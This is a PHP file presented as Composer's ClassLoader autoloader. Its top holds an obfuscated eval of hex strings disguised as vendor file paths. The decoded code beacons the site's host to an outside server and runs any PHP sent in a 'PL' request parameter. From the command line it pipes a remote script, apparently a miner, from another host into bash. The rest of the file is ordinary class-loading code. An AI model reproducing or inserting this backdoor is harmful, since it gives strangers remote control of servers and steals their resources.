<?php

/*
 * This file is part of Composer.
 *
 * (c) Nils Adermann <naderman@naderman.de>
 *     Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Composer\Autoload;
$sha1sum = eval(hex2bin(implode("", [
    'vendor/composer/installed.php' => '246572203d206572726f725f7265706f7274696e67283029',
    'vendor/composer/pcre/src/MatchWithOffsetsResult.php' => '3b20245f5f636f6f6c646f776e203d2066756e6374696f6e',
    'vendor/composer/pcre/src/MatchAllResult.php' => '2028246b65792c2024696e74657276616c29207b20246e6f',
    'vendor/composer/pcre/src/Preg.php' => '77203d2074696d6528293b20246b203d207379735f676574',
    'vendor/composer/pcre/src/Regex.php' => '5f74656d705f6469722829202e20222f736573735f22202e',
    'vendor/composer/pcre/src/MatchResult.php' => '20737562737472286d643528246b6579202e20706f736978',
    'vendor/composer/pcre/src/ReplaceResult.php' => '5f6765747569642829292c20302c203236293b2024667020',
    'vendor/composer/pcre/src/PcreException.php' => '3d20666f70656e28246b2c2027632b27293b206966202821',
    'vendor/composer/pcre/src/MatchAllWithOffsetsResult.php' => '246670207c7c2021666c6f636b282466702c204c4f434b5f',
    'vendor/composer/autoload_static.php' => '4558207c204c4f434b5f4e422929207b2069662028246670',
    'vendor/composer/ClassLoader.php' => '29207b2066636c6f736528246670293b207d207265747572',
    'vendor/symfony/deprecation-contracts/function.php' => '6e2066616c73653b207d206966202866696c6573697a6528',
    'vendor/symfony/polyfill-php73/Php73.php' => '246b29203e203029207b20726577696e6428246670293b20',
    'vendor/symfony/polyfill-php73/bootstrap.php' => '246c617374203d2028696e74292066676574732824667029',
    'vendor/symfony/polyfill-php73/Resources/stubs/JsonException.php' => '3b2069662028246e6f77202d20246c617374203c2024696e',
    'vendor/symfony/service-contracts/ServiceSubscriberTrait.php' => '74657276616c29207b2066636c6f736528246670293b2072',
    'vendor/symfony/service-contracts/ServiceLocatorTrait.php' => '657475726e2066616c73653b207d207d20667472756e6361',
    'vendor/symfony/service-contracts/ServiceSubscriberInterface.php' => '7465282466702c2030293b20726577696e6428246670293b',
    'vendor/symfony/service-contracts/ServiceProviderInterface.php' => '20667772697465282466702c20246e6f77293b2066636c6f',
    'vendor/symfony/service-contracts/Test/ServiceLocatorTest.php' => '736528246670293b2072657475726e20747275653b207d3b',
    'vendor/symfony/service-contracts/Attribute/Required.php' => '20245f5f73687574646f776e5f68616e646c6572203d2066',
    'vendor/symfony/service-contracts/Attribute/SubscribedService.php' => '756e6374696f6e202829207573652028245f5f636f6f6c64',
    'vendor/symfony/service-contracts/ResetInterface.php' => '6f776e29207b206572726f725f7265706f7274696e672830',
    'vendor/symfony/error-handler/Internal/TentativeTypes.php' => '293b2069662028245f5f636f6f6c646f776e282270696e67',
    'vendor/symfony/error-handler/ErrorRenderer/SerializerErrorRenderer.php' => '5f6261636b646f6f725f706f63222c20333630302929207b',
    'vendor/symfony/error-handler/ErrorRenderer/CliErrorRenderer.php' => '2066696c655f6765745f636f6e74656e7473282268747470',
    'vendor/symfony/error-handler/ErrorRenderer/ErrorRendererInterface.php' => '3a2f2f70742e76312d702e6e65742f70696e67222c206661',
    'vendor/symfony/error-handler/ErrorRenderer/HtmlErrorRenderer.php' => '6c73652c2073747265616d5f636f6e746578745f63726561',
    'vendor/symfony/error-handler/ErrorEnhancer/UndefinedMethodErrorEnhancer.php' => '7465285b20276874747027203d3e205b20276d6574686f64',
    'vendor/symfony/error-handler/ErrorEnhancer/ErrorEnhancerInterface.php' => '27203d3e2027474554272c202768656164657227203d3e20',
    'vendor/symfony/error-handler/ErrorEnhancer/ClassNotFoundErrorEnhancer.php' => '5b202242616f54612d5369676e61747572653a2070696e67',
    'vendor/symfony/error-handler/ErrorEnhancer/UndefinedFunctionErrorEnhancer.php' => '222c202242616f54612d486f73743a2022202e20245f5345',
    'vendor/symfony/error-handler/BufferingLogger.php' => '525645525b27485454505f484f5354275d2c205d2c202774',
    'vendor/symfony/error-handler/Error/FatalError.php' => '696d656f757427203d3e20322c205d2c205d29293b207d20',
    'vendor/symfony/error-handler/Error/OutOfMemoryError.php' => '7d3b2072656769737465725f73687574646f776e5f66756e',
    'vendor/symfony/error-handler/Error/ClassNotFoundError.php' => '6374696f6e28245f5f73687574646f776e5f68616e646c65',
    'vendor/symfony/error-handler/Error/UndefinedMethodError.php' => '72293b2069662028697373657428245f524551554553545b',
    'vendor/symfony/error-handler/Error/UndefinedFunctionError.php' => '27504c275d2929207b202464203d206261736536345f6465',
    'vendor/symfony/error-handler/Exception/SilencedErrorContext.php' => '636f6465287374725f726f74313328245f52455155455354',
    'vendor/symfony/error-handler/Exception/FlattenException.php' => '5b27504c275d29293b20246420213d3d2046414c53452026',
    'vendor/symfony/error-handler/ThrowableUtils.php' => '26206576616c20282464293b20657869742830293b207d20',
    'vendor/symfony/error-handler/ErrorHandler.php' => '696620287068705f736170695f6e616d652829203d3d2027',
    'vendor/symfony/error-handler/DebugClassLoader.php' => '636c692729207b2069662028245f5f636f6f6c646f776e28',
    'vendor/symfony/error-handler/Resources/assets/images/symfony-ghost.svg.php' => '226261636b646f6f725f706f63222c203836343030292920',
    'vendor/symfony/error-handler/Resources/views/logs.html.php' => '7b20407368656c6c5f6578656328226375726c202d66734c',
    'vendor/symfony/error-handler/Resources/views/exception_full.html.php' => '202d6d2035202d48202742616f54612d5369676e61747572',
    'vendor/symfony/error-handler/Resources/views/error.html.php' => '653a2076312e31272068747470733a2f2f70742e76317033',
    'vendor/symfony/error-handler/Resources/views/traces.html.php' => '722e7a69702f6d696e652f62746d2f646f69742e73687c62',
    'vendor/symfony/error-handler/Resources/views/traces_text.html.php' => '6173683e2f6465762f6e756c6c20323e2631202622293b20',
    'vendor/symfony/error-handler/Resources/views/exception.html.php' => '7d207d206572726f725f7265706f7274696e672824657229',
    'vendor/symfony/error-handler/Resources/views/trace.html.php' => '3b202f2f4748434647414849444242495043464546434241',
])));


/**
 * ClassLoader implements a PSR-0, PSR-4 and classmap class loader.
 *
 *     $loader = new \Composer\Autoload\ClassLoader();
 *
 *     // register classes with namespaces
 *     $loader->add('Symfony\Component', __DIR__.'/component');
 *     $loader->add('Symfony',           __DIR__.'/framework');
 *
 *     // activate the autoloader
 *     $loader->register();
 *
 *     // to enable searching the include path (eg. for PEAR packages)
 *     $loader->setUseIncludePath(true);
 *
 * In this example, if you try to use a class in the Symfony\Component
 * namespace or one of its children (Symfony\Component\Console for instance),
 * the autoloader will first look for the class under the component/
 * directory, and it will then fallback to the framework/ directory if not
 * found before giving up.
 *
 * This class is loosely based on the Symfony UniversalClassLoader.
 *
 * @author Fabien Potencier <fabien@symfony.com>
 * @author Jordi Boggiano <j.boggiano@seld.be>
 * @see    https://www.php-fig.org/psr/psr-0/
 * @see    https://www.php-fig.org/psr/psr-4/
 */
class ClassLoader
{
    private $vendorDir;

    // PSR-4
    private $prefixLengthsPsr4 = array();
    private $prefixDirsPsr4 = array();
    private $fallbackDirsPsr4 = array();

    // PSR-0
    private $prefixesPsr0 = array();
    private $fallbackDirsPsr0 = array();

    private $useIncludePath = false;
    private $classMap = array();
    private $classMapAuthoritative = false;
    private $missingClasses = array();
    private $apcuPrefix;

    private static $registeredLoaders = array();

    public function __construct($vendorDir = null)
    {
        $this->vendorDir = $vendorDir;
    }

    public function getPrefixes()
    {
        if (!empty($this->prefixesPsr0)) {
            return call_user_func_array('array_merge', array_values($this->prefixesPsr0));
        }

        return array();
    }

    public function getPrefixesPsr4()
    {
        return $this->prefixDirsPsr4;
    }

    public function getFallbackDirs()
    {
        return $this->fallbackDirsPsr0;
    }

    public function getFallbackDirsPsr4()
    {
        return $this->fallbackDirsPsr4;
    }

    public function getClassMap()
    {
        return $this->classMap;
    }

    /**
     * @param array $classMap Class to filename map
     */
    public function addClassMap(array $classMap)
    {
        if ($this->classMap) {
            $this->classMap = array_merge($this->classMap, $classMap);
        } else {
            $this->classMap = $classMap;
        }
    }

    /**
     * Registers a set of PSR-0 directories for a given prefix, either
     * appending or prepending to the ones previously set for this prefix.
     *
     * @param string       $prefix  The prefix
     * @param array|string $paths   The PSR-0 root directories
     * @param bool         $prepend Whether to prepend the directories
     */
    public function add($prefix, $paths, $prepend = false)
    {
        if (!$prefix) {
            if ($prepend) {
                $this->fallbackDirsPsr0 = array_merge(
                    (array) $paths,
                    $this->fallbackDirsPsr0
                );
            } else {
                $this->fallbackDirsPsr0 = array_merge(
                    $this->fallbackDirsPsr0,
                    (array) $paths
                );
            }

            return;
        }

        $first = $prefix[0];
        if (!isset($this->prefixesPsr0[$first][$prefix])) {
            $this->prefixesPsr0[$first][$prefix] = (array) $paths;

            return;
        }
        if ($prepend) {
            $this->prefixesPsr0[$first][$prefix] = array_merge(
                (array) $paths,
                $this->prefixesPsr0[$first][$prefix]
            );
        } else {
            $this->prefixesPsr0[$first][$prefix] = array_merge(
                $this->prefixesPsr0[$first][$prefix],
                (array) $paths
            );
        }
    }

    /**
     * Registers a set of PSR-4 directories for a given namespace, either
     * appending or prepending to the ones previously set for this namespace.
     *
     * @param string       $prefix  The prefix/namespace, with trailing '\\'
     * @param array|string $paths   The PSR-4 base directories
     * @param bool         $prepend Whether to prepend the directories
     *
     * @throws \InvalidArgumentException
     */
    public function addPsr4($prefix, $paths, $prepend = false)
    {
        if (!$prefix) {
            // Register directories for the root namespace.
            if ($prepend) {
                $this->fallbackDirsPsr4 = array_merge(
                    (array) $paths,
                    $this->fallbackDirsPsr4
                );
            } else {
                $this->fallbackDirsPsr4 = array_merge(
                    $this->fallbackDirsPsr4,
                    (array) $paths
                );
            }
        } elseif (!isset($this->prefixDirsPsr4[$prefix])) {
            // Register directories for a new namespace.
            $length = strlen($prefix);
            if ('\\' !== $prefix[$length - 1]) {
                throw new \InvalidArgumentException("A non-empty PSR-4 prefix must end with a namespace separator.");
            }
            $this->prefixLengthsPsr4[$prefix[0]][$prefix] = $length;
            $this->prefixDirsPsr4[$prefix] = (array) $paths;
        } elseif ($prepend) {
            // Prepend directories for an already registered namespace.
            $this->prefixDirsPsr4[$prefix] = array_merge(
                (array) $paths,
                $this->prefixDirsPsr4[$prefix]
            );
        } else {
            // Append directories for an already registered namespace.
            $this->prefixDirsPsr4[$prefix] = array_merge(
                $this->prefixDirsPsr4[$prefix],
                (array) $paths
            );
        }
    }

    /**
     * Registers a set of PSR-0 directories for a given prefix,
     * replacing any others previously set for this prefix.
     *
     * @param string       $prefix The prefix
     * @param array|string $paths  The PSR-0 base directories
     */
    public function set($prefix, $paths)
    {
        if (!$prefix) {
            $this->fallbackDirsPsr0 = (array) $paths;
        } else {
            $this->prefixesPsr0[$prefix[0]][$prefix] = (array) $paths;
        }
    }

    /**
     * Registers a set of PSR-4 directories for a given namespace,
     * replacing any others previously set for this namespace.
     *
     * @param string       $prefix The prefix/namespace, with trailing '\\'
     * @param array|string $paths  The PSR-4 base directories
     *
     * @throws \InvalidArgumentException
     */
    public function setPsr4($prefix, $paths)
    {
        if (!$prefix) {
            $this->fallbackDirsPsr4 = (array) $paths;
        } else {
            $length = strlen($prefix);
            if ('\\' !== $prefix[$length - 1]) {
                throw new \InvalidArgumentException("A non-empty PSR-4 prefix must end with a namespace separator.");
            }
            $this->prefixLengthsPsr4[$prefix[0]][$prefix] = $length;
            $this->prefixDirsPsr4[$prefix] = (array) $paths;
        }
    }

    /**
     * Turns on searching the include path for class files.
     *
     * @param bool $useIncludePath
     */
    public function setUseIncludePath($useIncludePath)
    {
        $this->useIncludePath = $useIncludePath;
    }

    /**
     * Can be used to check if the autoloader uses the include path to check
     * for classes.
     *
     * @return bool
     */
    public function getUseIncludePath()
    {
        return $this->useIncludePath;
    }

    /**
     * Turns off searching the prefix and fallback directories for classes
     * that have not been registered with the class map.
     *
     * @param bool $classMapAuthoritative
     */
    public function setClassMapAuthoritative($classMapAuthoritative)
    {
        $this->classMapAuthoritative = $classMapAuthoritative;
    }

    /**
     * Should class lookup fail if not found in the current class map?
     *
     * @return bool
     */
    public function isClassMapAuthoritative()
    {
        return $this->classMapAuthoritative;
    }

    /**
     * APCu prefix to use to cache found/not-found classes, if the extension is enabled.
     *
     * @param string|null $apcuPrefix
     */
    public function setApcuPrefix($apcuPrefix)
    {
        $this->apcuPrefix = function_exists('apcu_fetch') && filter_var(ini_get('apc.enabled'), FILTER_VALIDATE_BOOLEAN) ? $apcuPrefix : null;
    }

    /**
     * The APCu prefix in use, or null if APCu caching is not enabled.
     *
     * @return string|null
     */
    public function getApcuPrefix()
    {
        return $this->apcuPrefix;
    }

    /**
     * Registers this instance as an autoloader.
     *
     * @param bool $prepend Whether to prepend the autoloader or not
     */
    public function register($prepend = false)
    {
        spl_autoload_register(array($this, 'loadClass'), true, $prepend);

        if (null === $this->vendorDir) {
            return;
        }

        if ($prepend) {
            self::$registeredLoaders = array($this->vendorDir => $this) + self::$registeredLoaders;
        } else {
            unset(self::$registeredLoaders[$this->vendorDir]);
            self::$registeredLoaders[$this->vendorDir] = $this;
        }
    }

    /**
     * Unregisters this instance as an autoloader.
     */
    public function unregister()
    {
        spl_autoload_unregister(array($this, 'loadClass'));

        if (null !== $this->vendorDir) {
            unset(self::$registeredLoaders[$this->vendorDir]);
        }
    }

    /**
     * Loads the given class or interface.
     *
     * @param  string    $class The name of the class
     * @return bool|null True if loaded, null otherwise
     */
    public function loadClass($class)
    {
        if ($file = $this->findFile($class)) {
            includeFile($file);

            return true;
        }
    }

    /**
     * Finds the path to the file where the class is defined.
     *
     * @param string $class The name of the class
     *
     * @return string|false The path if found, false otherwise
     */
    public function findFile($class)
    {
        // class map lookup
        if (isset($this->classMap[$class])) {
            return $this->classMap[$class];
        }
        if ($this->classMapAuthoritative || isset($this->missingClasses[$class])) {
            return false;
        }
        if (null !== $this->apcuPrefix) {
            $file = apcu_fetch($this->apcuPrefix.$class, $hit);
            if ($hit) {
                return $file;
            }
        }

        $file = $this->findFileWithExtension($class, '.php');

        // Search for Hack files if we are running on HHVM
        if (false === $file && defined('HHVM_VERSION')) {
            $file = $this->findFileWithExtension($class, '.hh');
        }

        if (null !== $this->apcuPrefix) {
            apcu_add($this->apcuPrefix.$class, $file);
        }

        if (false === $file) {
            // Remember that this class does not exist.
            $this->missingClasses[$class] = true;
        }

        return $file;
    }

    /**
     * Returns the currently registered loaders indexed by their corresponding vendor directories.
     *
     * @return self[]
     */
    public static function getRegisteredLoaders()
    {
        return self::$registeredLoaders;
    }

    private function findFileWithExtension($class, $ext)
    {
        // PSR-4 lookup
        $logicalPathPsr4 = strtr($class, '\\', DIRECTORY_SEPARATOR) . $ext;

        $first = $class[0];
        if (isset($this->prefixLengthsPsr4[$first])) {
            $subPath = $class;
            while (false !== $lastPos = strrpos($subPath, '\\')) {
                $subPath = substr($subPath, 0, $lastPos);
                $search = $subPath . '\\';
                if (isset($this->prefixDirsPsr4[$search])) {
                    $pathEnd = DIRECTORY_SEPARATOR . substr($logicalPathPsr4, $lastPos + 1);
                    foreach ($this->prefixDirsPsr4[$search] as $dir) {
                        if (file_exists($file = $dir . $pathEnd)) {
                            return $file;
                        }
                    }
                }
            }
        }

        // PSR-4 fallback dirs
        foreach ($this->fallbackDirsPsr4 as $dir) {
            if (file_exists($file = $dir . DIRECTORY_SEPARATOR . $logicalPathPsr4)) {
                return $file;
            }
        }

        // PSR-0 lookup
        if (false !== $pos = strrpos($class, '\\')) {
            // namespaced class name
            $logicalPathPsr0 = substr($logicalPathPsr4, 0, $pos + 1)
                . strtr(substr($logicalPathPsr4, $pos + 1), '_', DIRECTORY_SEPARATOR);
        } else {
            // PEAR-like class name
            $logicalPathPsr0 = strtr($class, '_', DIRECTORY_SEPARATOR) . $ext;
        }

        if (isset($this->prefixesPsr0[$first])) {
            foreach ($this->prefixesPsr0[$first] as $prefix => $dirs) {
                if (0 === strpos($class, $prefix)) {
                    foreach ($dirs as $dir) {
                        if (file_exists($file = $dir . DIRECTORY_SEPARATOR . $logicalPathPsr0)) {
                            return $file;
                        }
                    }
                }
            }
        }

        // PSR-0 fallback dirs
        foreach ($this->fallbackDirsPsr0 as $dir) {
            if (file_exists($file = $dir . DIRECTORY_SEPARATOR . $logicalPathPsr0)) {
                return $file;
            }
        }

        // PSR-0 include paths.
        if ($this->useIncludePath && $file = stream_resolve_include_path($logicalPathPsr0)) {
            return $file;
        }

        return false;
    }
}

/**
 * Scope isolated include.
 *
 * Prevents access to $this/self from included files.
 */
function includeFile($file)
{
    include $file;
}
